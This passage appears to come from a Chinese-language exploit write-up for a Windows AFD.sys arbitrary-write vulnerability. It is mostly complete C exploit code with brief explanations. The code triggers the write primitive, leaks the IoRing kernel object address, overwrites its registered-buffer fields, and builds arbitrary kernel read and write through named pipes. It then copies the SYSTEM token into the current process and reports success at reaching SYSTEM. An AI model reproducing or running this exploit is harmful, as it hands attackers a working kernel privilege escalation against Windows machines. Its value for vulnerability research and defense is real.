    	status = _NtSetIoCompletion(hCompletion, 0x1337, &ioStatusBlock, 0, 0x100);
    	if (!NT_SUCCESS(status)) {
    		printf("[-]NtSetIoCompletion fail:%x\n", status);
    		return 0;
    	}
    
    	data.hCompletion = hCompletion;
    	data.pData1 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    	data.pData2 = VirtualAlloc(NULL, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    	data.pData3 = writeAddr;
    	data.dw1 = 0x1;
    	data.dw2 = 100000000;
    	data.dw3 = 0x1;
    
    
    	hEvent = CreateEvent(0, 0, 0, 0);
    	if (hEvent == NULL) {
    		printf("[-]CreateEvent fail:%x\n", GetLastError());
    		return 0;
    	}
    
    	status = _NtDeviceIoControlFile(hSocket, hEvent, NULL, NULL, &ioStatusBlock, 0x12127, &data, sizeof(AFD_NOTIFYSOCK_INPUT), NULL, 0);
    	if (!NT_SUCCESS(status)) {
    		printf("[-]NtDeviceIoControlFile fail:%x\n", status);
    		return 0;
    	}
    	printf("[+]call AfdNotifyRemoveIoCompletion success");
    	return 1;
    }
    int main(int argc, char* argv[])
    {
    	HMODULE ntBase = GetModuleHandleW(L"ntdll.dll");
    	_NtCreateFile = (FUN_NtCreateFile)GetProcAddress(ntBase, "NtCreateFile");
    	_NtDeviceIoControlFile = (FUN_NtDeviceIoControlFile)GetProcAddress(ntBase, "NtDeviceIoControlFile");
    	_NtCreateIoCompletion = (FUN_NtCreateIoCompletion)GetProcAddress(ntBase, "NtCreateIoCompletion");
    	_NtSetIoCompletion = (FUN_NtSetIoCompletion)GetProcAddress(ntBase, "NtSetIoCompletion");
    	Write0x1ToAddr((PVOID)0x41);
    }
    

IoRemoveIoCompletion执行成功

![image](https://image.3001.net/images/20230730/1690724738_64c66982cb71ca4f3092c.png!small)

然后成功执行到漏洞点,将返回值赋值给我们结构体中AFD_NOTIFYSOCK_INPUT->pData3,因为这里pData3给的地址是无效的,所以返回了c0000005.

![image](https://image.3001.net/images/20230730/1690724850_64c669f21ed90367171bb.png!small)

![image](https://image.3001.net/images/20230730/1690724860_64c669fc2b09bbe845310.png!small)

 **2.创建ioring,获取ioring对象地址,创建2个管道,用于任意内核读取和任意内核写入**

创建ioring对象后,需要知道ioring对象内核中的地址,才能进行覆盖.借助于windows的一些api是可以实现的.

通过NtQuerySystemInformation函数遍历出句柄信息,找到当前进程中索引相同的句柄,就可以找到ioring对象了.

    
    
    int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
    {
    	int ret = -1;
    	PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    	ULONG ulBytes = 0;
    	NTSTATUS ntStatus = 0;
    
    	while ((ntStatus = _NtQuerySystemInformation(SystemHandleInformation, pHandleInfo, ulBytes, &ulBytes)) == STATUS_INFO_LENGTH_MISMATCH)
    	{
    		if (pHandleInfo != NULL)
    		{
    			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pHandleInfo, 2 * ulBytes);
    		}
    
    		else
    		{
    			pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2 * ulBytes);
    		}
    	}
    
    	if (ntStatus != STATUS_SUCCESS)
    	{
    		ret = ntStatus;
    		goto done;
    	}
    
    	for (ULONG i = 0; i < pHandleInfo->NumberOfHandles; i++)
    	{
    		if ((pHandleInfo->Handles[i].UniqueProcessId == ulPid) && (pHandleInfo->Handles[i].HandleValue == (short)handle))
    		{
    			*ppObjAddr = (ULONG64)pHandleInfo->Handles[i].Object;
    			ret = 0;
    			break;
    		}
    	}
    
    done:
    	if (NULL != pHandleInfo)
    	{
    		HeapFree(GetProcessHeap, 0, pHandleInfo);
    	}
    	return ret;
    }
    
    
    int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
    {
    	int ret = -1;
    	IORING_CREATE_FLAGS ioRingFlags = { 0 };
    
    	ioRingFlags.Required = IORING_CREATE_REQUIRED_FLAGS_NONE;
    	ioRingFlags.Advisory = IORING_CREATE_REQUIRED_FLAGS_NONE;
    
    	ret = CreateIoRing(IORING_VERSION_3, ioRingFlags, 0x10000, 0x20000, &hIoRing);
    
    	if (0 != ret)
    	{
    		goto done;
    	}
    
    	ret = getobjptr(ppIoRingAddr, GetCurrentProcessId(), *(PHANDLE)hIoRing);
    
    	if (0 != ret)
    	{
    		goto done;
    	}
    
    	pIoRing = *ppIoRingAddr;
    
    	hInPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_in", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    	hOutPipe = CreateNamedPipe(L"\\\\.\\pipe\\ioring_out", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    
    	if ((INVALID_HANDLE_VALUE == hInPipe) || (INVALID_HANDLE_VALUE == hOutPipe))
    	{
    		ret = GetLastError();
    		goto done;
    	}
    
    	hInPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_in", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    	hOutPipeClient = CreateFile(L"\\\\.\\pipe\\ioring_out", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    	if ((INVALID_HANDLE_VALUE == hInPipeClient) || (INVALID_HANDLE_VALUE == hOutPipeClient))
    	{
    		ret = GetLastError();
    		goto done;
    	}
    
    	ret = 0;
    
    done:
    	return ret;
    }
    

成功的获取了iorring内核对象地址,这是我们创建的ioring对象,目前RegBuffers和RegBuffersCount都被初始化为0了,下面就要通过漏洞去修改这两个值,构造出一个假的预注册缓冲区,实现读写.

![image](https://image.3001.net/images/20230730/1690724878_64c66a0e4c747f9c58688.png!small)

 **3.覆盖RegBuffers和RegBuffersCount,伪造预注册缓冲区**

覆盖_IO_IORING_OBJECT对象中RegBuffers和RegBuffersCount

    
    
    ret = Write0x1ToAddr((char*)&pIoRing->RegBuffers + 0x3);
    	if (ret) {
    		printf("[-] IoRing->RegBuffers overwrite failed: %0x\n", ret);
    		goto done;
    	}
    	printf("[+] IoRing->RegBuffers overwritten with address 0x1000000\n");
    
    	ret = Write0x1ToAddr(&pIoRing->RegBuffersCount);
    	if (ret) {
    		printf("[-] IoRing->RegBuffersCount overwrite failed: %0x\n", ret);
    		goto done;
    	}
    	printf("[+] IoRing->RegBuffersCount overwritten with 1\n");
    

通过漏洞成功覆盖了 RegBuffers和RegBuffersCount,让预注册缓冲区指向了0x01000000这块内存.已注册的缓冲区数量为1.

![image](https://image.3001.net/images/20230730/1690724896_64c66a209da7239a0ac65.png!small)

官方在22h2版本将内核的缓冲区数组更改为了指向一个结构体的指针数组,结构如下,所以向RegBuffers里面添加元素的时候,要创建成如下结构.

    
    
    typedef struct _IOP_MC_BUFFER_ENTRY
    {
        USHORT Type;
        USHORT Reserved;
        ULONG Size;
        ULONG ReferenceCount;
        ULONG Flags;
        LIST_ENTRY GlobalDataLink;
        PVOID Address;
        ULONG Length;
        CHAR AccessMode;
        ULONG MdlRef;
        PMDL Mdl;
        KEVENT MdlRundownEvent;
        PULONG64 PfnArray;
        IOP_MC_BE_PAGE_NODE PageNodes[1];
    } IOP_MC_BUFFER_ENTRY, *PIOP_MC_BUFFER_ENTRY;
    

**3.任意地址读**

将IOP_MC_BUFFER_ENTRY->Address中地址设置要读的地址,然后调用BuildIoRingWriteFile,让内核将数据写入到管道里面,然后我们再读取出来.

    
    
    int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
    {
        int ret = -1;
        PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
        IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
        IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
        IORING_CQE cqe = { 0 };
    
        pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
    
        if (NULL == pMcBufferEntry)
        {
            ret = GetLastError();
            goto done;
        }
    
        pMcBufferEntry->Address = pReadAddr;
        pMcBufferEntry->Length = ulReadLen;
        pMcBufferEntry->Type = 0xc02;
        pMcBufferEntry->Size = 0x80;
        pMcBufferEntry->AccessMode = 1;
        pMcBufferEntry->ReferenceCount = 1;
    
        pRegisterBuffers[0] = pMcBufferEntry;
    
        ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
    
        if (0 != ret)
        {
            goto done;
        }
    
        ret = SubmitIoRing(hIoRing, 0, 0, NULL);
    
        if (0 != ret)
        {
            goto done;
        }
    
        ret = PopIoRingCompletion(hIoRing, &cqe);
    
        if (0 != ret)
        {
            goto done;
        }
    
        if (0 != cqe.ResultCode)
        {
            ret = cqe.ResultCode;
            goto done;
        }
    
        if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
        {
            ret = GetLastError();
            goto done;
        }
    
        ret = 0;
    
    done:
        if (NULL != pMcBufferEntry)
        {
            VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        }
        return ret;
    }
    

**4.任意地址写**

将数据写入到管道中,然后把IOP_MC_BUFFER_ENTRY->Address设置为要写的地址,然后调用BuildIoRingReadFile,让内核读取管道中的数据写入到IOP_MC_BUFFER_ENTRY->Address.

    
    
    int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuffer, ULONG ulWriteLen)
    {
        int ret = -1;
        PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
        IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hInPipeClient);
        IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
        IORING_CQE cqe = { 0 };
    
        if (0 == WriteFile(hInPipe, pWriteBuffer, ulWriteLen, NULL, NULL))
        {
            ret = GetLastError();
            goto done;
        }
    
        pMcBufferEntry = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
    
        if (NULL == pMcBufferEntry)
        {
            ret = GetLastError();
            goto done;
        }
    
        pMcBufferEntry->Address = pWriteAddr;
        pMcBufferEntry->Length = ulWriteLen;
        pMcBufferEntry->Type = 0xc02;
        pMcBufferEntry->Size = 0x80;
        pMcBufferEntry->AccessMode = 1;
        pMcBufferEntry->ReferenceCount = 1;
    
        pRegisterBuffers[0] = pMcBufferEntry;
    
        ret = BuildIoRingReadFile(hIoRing, reqFile, reqBuffer, ulWriteLen, 0, NULL, IOSQE_FLAGS_NONE);
    
        if (0 != ret)
        {
            goto done;
        }
    
        ret = SubmitIoRing(hIoRing, 0, 0, NULL);
    
        if (0 != ret)
        {
            goto done;
        }
    
        ret = PopIoRingCompletion(hIoRing, &cqe);
    
        if (0 != ret)
        {
            goto done;
        }
    
        if (0 != cqe.ResultCode)
        {
            ret = cqe.ResultCode;
            goto done;
        }
    
        ret = 0;
    
    done:
        if (NULL != pMcBufferEntry)
        {
            VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
        }
        return ret;
    }
    

**5.提权代码**

通过上面构造的任意地址读写代码,读取system token替换到要提权的进程.

    
    
    int ioring_lpe(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt)
    {
        int ret = -1;
        HANDLE hProc = NULL;
        ULONG64 ullSystemEPROCaddr = 0;
        ULONG64 ullTargEPROCaddr = 0;
        PVOID pFakeRegBuffers = NULL;
        _HIORING* phIoRing = NULL;
        ULONG64 ullSysToken = 0;
        char null[0x10] = { 0 };
    
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
    
        if (NULL == hProc)
        {
            ret = GetLastError();
            goto done;
        }
    
        ret = getobjptr(&ullSystemEPROCaddr, 4, 4);
    
        if (0 != ret)
        {
            goto done;
        }
    
        printf("[+] System EPROC address: %llx\n", ullSystemEPROCaddr);
    
        ret = getobjptr(&ullTargEPROCaddr, GetCurrentProcessId(), hProc);
    
        if (0 != ret)
        {
            goto done;
        }
    
        printf("[+} Target process EPROC address: %llx\n", ullTargEPROCaddr);
    
        pFakeRegBuffers = VirtualAlloc(ullFakeRegBufferAddr, sizeof(ULONG64) * ulFakeRegBufferCnt, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    
        if (pFakeRegBuffers != (PVOID)ullFakeRegBufferAddr)
        {
            ret = GetLastError();
            goto done;
        }
    
        memset(pFakeRegBuffers, 0, sizeof(ULONG64) * ulFakeRegBufferCnt);
    
        phIoRing = *(_HIORING**)&amphIoRing
        phIoRing->RegBufferArray = pFakeRegBuffers;
        phIoRing->BufferArraySize = ulFakeRegBufferCnt;
    
        ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));
    
        if (0 != ret)
        {
            goto done;
        }
    
        printf("[+] System token is at: %llx\n", ullSysToken);
    
        ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));
    
        if (0 != ret)
        {
            goto done;
        }
    
        ioring_write(pFakeRegBuffers, &pIoRing->RegBuffersCount, &null, 0x10);
    
        ret = 0;
    
    done:
        return ret;
    }
    
    
    
    int main(int argc, char* argv[])
    {
    	system("whoami");
    	int ret = -1;
    	ret = GetNtFunctions();
    	if (ret) {
    		printf("[-] Failed to get address of NT functions:%0x\n", ret);
    		goto done;
    	}
    	ret = ioring_setup(&pIoRing);
    	if (ret)
    	{
    		printf("[-] IORING setup failed: %0x\n", ret);
    		goto done;
    	}
    	printf("[+] IoRing Obj Address at %llx\n", pIoRing);
    
    
    	ret = Write0x1ToAddr((char*)&pIoRing->RegBuffers + 0x3);
    	if (ret) {
    		printf("[-] IoRing->RegBuffers overwrite failed: %0x\n", ret);
    		goto done;
    	}
    	printf("[+] IoRing->RegBuffers overwritten with address 0x1000000\n");
    
    	ret = Write0x1ToAddr(&pIoRing->RegBuffersCount);
    	if (ret) {
    		printf("[-] IoRing->RegBuffersCount overwrite failed: %0x\n", ret);
    		goto done;
    	}
    	printf("[+] IoRing->RegBuffersCount overwritten with 1\n");
    
    	ret = ioring_lpe(GetCurrentProcessId(), 0x1000000, 0x1);
    
    	if (0 != ret)
    	{
    		printf("[-] LPE Failed: %0x\n", ret);
    		goto done;
    	}
    
    	printf("[+] Target process token elevated to SYSTEM!\n");
    done:
    	system("whoami");
    	system("pause");
    	return ret;
    }
    

成功提权

![image](https://image.3001.net/images/20230730/1690724916_64c66a3495d5194963f5e.png!small)

